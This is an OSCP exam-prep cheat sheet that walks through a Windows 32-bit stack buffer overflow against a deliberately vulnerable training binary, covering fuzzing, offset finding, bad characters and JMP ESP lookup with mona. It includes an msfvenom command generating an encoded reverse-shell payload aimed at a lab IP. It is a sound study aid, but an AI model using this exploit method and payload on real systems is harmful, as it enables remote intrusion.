# OSCP Buffer Overflow Cheat Sheet

The exploitation of the stack buffer overflow in the OSCP exam is based on Windows 32-bit systems.

In this cheat sheet we will use dostackbufferoverflowgod as a vulnerable application in our exploration process (more info here: https://github.com/justinsteven/dostackbufferoverflowgood).

The binary can be downloaded here: https://github.com/justinsteven/dostackbufferoverflowgood/blob/master/dostackbufferoverflowgood.exe

Below are the download links for all the tools needed for the study:

- Windows 7 Evaluation: https://gist.github.com/anonymous/c644cac9d77e2793742c13cf10d26cb8
- Immunity Debugger: https://www.immunityinc.com/products/debugger/
- Mona.py: https://github.com/corelan/mona

All installation processes are described in the links above.


## Fuzzing

We will run the connect.py script to verify the application's response.

After this step, we will run the fuzzing.py script to identify the point that the application will crack. But before that, on your Windows, attach the application to the Immunity Debugger.

## Offset

After finding the crash point of the application, we will identify the offset to the EIP address. For this we will generate a string of strings with the pattern_create, from the MSF suite

msf-pattern_create -l 1024

Copy the EIP address into the Immunity Debugger and use the pattern_offset to identify this address

msf-pattern_offset -q 39654138

Now we can run poc.py and verify that our EIP has been overwritten with the character "B" (42 in hexadecimal)


## Badchars

To identify badchars we will use mona with the option !mona bytearray.

Insert the mona output in the badchars.py script and run against the application to identify the badchars.


There are many ways to carry out the badchar identification process (even mona has modules for that), but the most accurate way is visually. Follow the ASCII string in the Immunity Debugger and see what points this string crashed or skipped over.


## JMP ESP

After knowing the badchars of the application, we will identify the JMP ESP that will be responsible for changing the natural flow of the application and making it run the shellcode that we will insert into the stack.

The OPCODE for JMP ESP is \xff\xe4 (in assembly). Using mona we will locate which register in the application that points to this OPCODE and so we can change the flow of the application to run our shellcode, rewriting the stack from its base (EBP).

Run !mona modules and identify the unprotected modules.

Run !mona find -s "\xff\xe4" to identify which of these pointers have the OPCODE for JMP ESP

Run !mona jmp -r esp -cpb "\x00\x0a" to identify which pointers do not have the badchars found.

By this point you may have already found the correct JMP ESP address. However, if you want to check, run !mona find -s "\xff\xe4" -m dostackbufferoverflowgood.exe directly on the identified vulnerable module.

At this point you will have the base address of the stack or return address (EBP). We need to convert this address to little-endian format to use it in our code. We need to convert this address to little-endian format to use it in our code. Just invert the bytes to perform this conversion:

 0x080416BF to "\xBF\x16\x04\x08"
 
 
 
 ## Exploit time
 
 We can now generate our shellcode excluding the badchars found:
 
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.103 LPORT=443 EXITFUNC=thread  -f c –e x86/shikata_ga_nai -b "\x00\x0a"
 
 The EXITFUNC=thread option prevents the shellcode from crashing the application when executing our shellcode.
 
 Now just insert the msfvenom output in our exploit.py and run it against our application to gain access to the system exploiting the Buffer Overflow

